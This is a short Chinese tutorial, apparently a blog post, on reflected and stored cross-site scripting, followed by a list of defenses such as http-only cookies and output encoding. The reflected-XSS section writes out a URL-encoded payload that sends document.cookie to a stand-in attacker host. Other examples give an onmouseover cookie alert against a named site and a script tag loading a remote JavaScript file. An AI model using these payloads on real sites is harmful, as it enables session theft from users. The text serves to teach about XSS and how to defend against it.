---
title: 跨站脚本攻击 (XSS)
categories: Web 安全
tags: [web 安全]
date: 2021-01-14 15:42:00
---

# 跨站脚本攻击 (XSS)

跨站脚本攻击 XSS (Cross Site Scripts)

说明：攻击者盗取用户的身份信息（如Cookie）、导航到恶意网址、携带木马病毒等 原理：攻击者在网页中嵌入客户端脚本(如JavaScript), 用户浏览网页就会触发恶意脚本执行


### 1. 反射型XSS步骤

1. 用户正常登录Web应用程序，登录成功会得到一个会话信息的 `cookie`
2. 攻击者将含有攻击代码的URL发送给被攻击人，例：`http://fovweb.com/xss/message.php?send=%3Cscript%3Edocument.write(‘%3Cimg%20height=0%20width=0%20src=%22 http://hacker.fovweb.com/xss/cookie_save.php%3Fcookie=%3D’%20+%20encodeURL(document.cookie)%20+%20’%22/%3E’)%3C/script%3E`
3. 用户打开攻击者发送过来的 URL, Web 应用程序执行用户发出的请求，并将请求参数显示在页面中；
4. 请求参数中包含的 JavaScript 代码会被执行，用户的 cookie 信息将会被发送到攻击者；

**note:**
* 链接中的请求参数会被显示在页面中，如搜索关键字、表单输入框等
* 链接必须被用户点击才会触发
* 危害范围小，受害者人数较少
* 例子：`http://health.sohu.com/so/index.shtml?t=news&wd=%E6%84%9F%E5%86%92%27%22onmouseover=%22alert(document.cookie)%22`


### 2. 持久型 XSS 步骤

1. 攻击者向存在漏洞的网站注入恶意代码，如`http://a.com/a.jsp?name=xss<script src=http://b.com/b.js></script>`
2. 用户访问该网站会下载 js 文件，并执行里面的代码
3. js 可获取用户所有的所有信息（包括Cookie、Session等）并发送给攻击者
  
**note：**
* 攻击者提交的数据会被显示出来，并被所有人看到，如社区评论等
* 访问存在漏洞的网站就会触发
* 危害范围大，受害者人数较多


### 3. 防御措施
* 在服务器端设置 Cookie 为 `http-only`，浏览器会禁止 js 访问该 `Cookie`
* 输入检查，对用户提交的数据进行校验，对特殊字符进行编码和过滤（主要在后端）
* 输出检查，对渲染到 html 中的内容进行 htmlEncode（主要在前端）
* 针对不同的上下文调用不同的转义规则，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致
* 利用模板引擎，避免内联事件，避免拼接 HTML
